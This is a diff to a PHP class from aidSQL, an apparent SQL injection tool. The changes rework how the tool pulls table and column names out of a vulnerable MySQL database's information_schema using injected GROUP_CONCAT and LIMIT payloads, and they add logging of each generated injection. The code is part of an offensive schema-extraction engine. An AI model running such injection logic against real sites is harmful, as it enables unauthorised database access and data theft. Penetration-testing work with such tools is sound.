@@ -421,18 +421,18 @@
 					throw(new \Exception("Database version mismatch: $version, cant get database schema!",0,"red"));
 				}
 
-				$select		=	"GROUP_CONCAT(TABLE_NAME)";
-				$from			=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
+				$select									=	"GROUP_CONCAT(TABLE_NAME)";
+				$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
 
-				$tables		=	$this->execute($select,$from);
-				$dbSchema	=	new \aidSQL\core\DatabaseSchema();
+				$tables									=	$this->execute($select,$from);
+				$dbSchema								=	new \aidSQL\core\DatabaseSchema();
+				$restoreTerminatingPayload			=	$this->_currTerminatingPayload;
 
 				if($this->detectTruncatedData($tables)){	//We have to do 1 by 1 table retrieval :/ bigger foot print
 
 					$this->log("Performing table extraction one by one",2,"yellow");
 
 					$limit									=	1;
-					$restoreTerminatingPayload			=	$this->_currTerminatingPayload;
 					$select									=	"TABLE_NAME";
 					$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
 
@@ -444,11 +444,12 @@
 
 						$restoreTPayLoad	=	$this->_currTerminatingPayload	=	"LIMIT ".$limit++.",1";
 
-						//Add the table and the columns of the table to the DatabaseSchema Object
+						//Add just the table to the table to the DatabaseSchema Object
+						//Columns are retrieved from the runner, this is just because some people
+						//will just like to retrieve all tables and leverage the footprint by not 
+						//fetching table structure
 
-						$tableColumns	=	$this->getColumns($table);
-
-						$dbSchema->addTable($table,$tableColumns);
+						$dbSchema->addTable($table,array());
 
 					}
 
@@ -472,7 +473,7 @@
 			}
 
 
-			private function getColumns($table=NULL){
+			public function getColumns($table=NULL){
 
 				if(is_null($table)){
 
@@ -483,8 +484,6 @@
 
 				$this->log("Fetching table \"$table\" columns ...",0,"white");
 
-				$table							=	
-
 				$select							=	"GROUP_CONCAT(COLUMN_NAME)";
 				$from								=	"FROM information_schema.columns WHERE table_schema=DATABASE() ".
 														"AND table_name=".\String::hexEncode($table);
@@ -493,11 +492,6 @@
 				$this->_currTerminatingPayload	=	"LIMIT 1,1";
 
 				$tableFields	=	$this->execute($select,$from);
-
-				if(empty($tableFields)){
-					$this->log("Couldnt fetch fields for table $table",1,"red");
-					return array();
-				}
 
 				if($this->detectTruncatedData($tableFields)){
 
@@ -544,12 +538,16 @@
 			protected function execute($select,$from=NULL,$useConcat=TRUE){
 
 				$this->log("Doing $select Injection",0,"light_green");
+				$generatedInjection	=	$this->generateInjection($select,$from,$useConcat);
+				$this->log($generatedInjection,0,"light_cyan");
 
-				$result	=	$this->analyzeInjection($this->generateInjection($select,$from,$useConcat));
+				$result	=	$this->analyzeInjection($generatedInjection);
 
 				if($this->_isVulnerable){
 
 					if($result===FALSE){		//Found vulnerable however something is failing, start injection from scratch
+
+						$restoreMaxFields	=	$this->_maxFields;
 
 						$this->log("Something wrong is going on here, restarting the $select injection",2,"yellow");
 
@@ -566,6 +564,8 @@
 							$this->_maxFields++;
 
 						}
+
+						$this->_maxFields	=	$restoreMaxFields;
 
 						return FALSE;
 
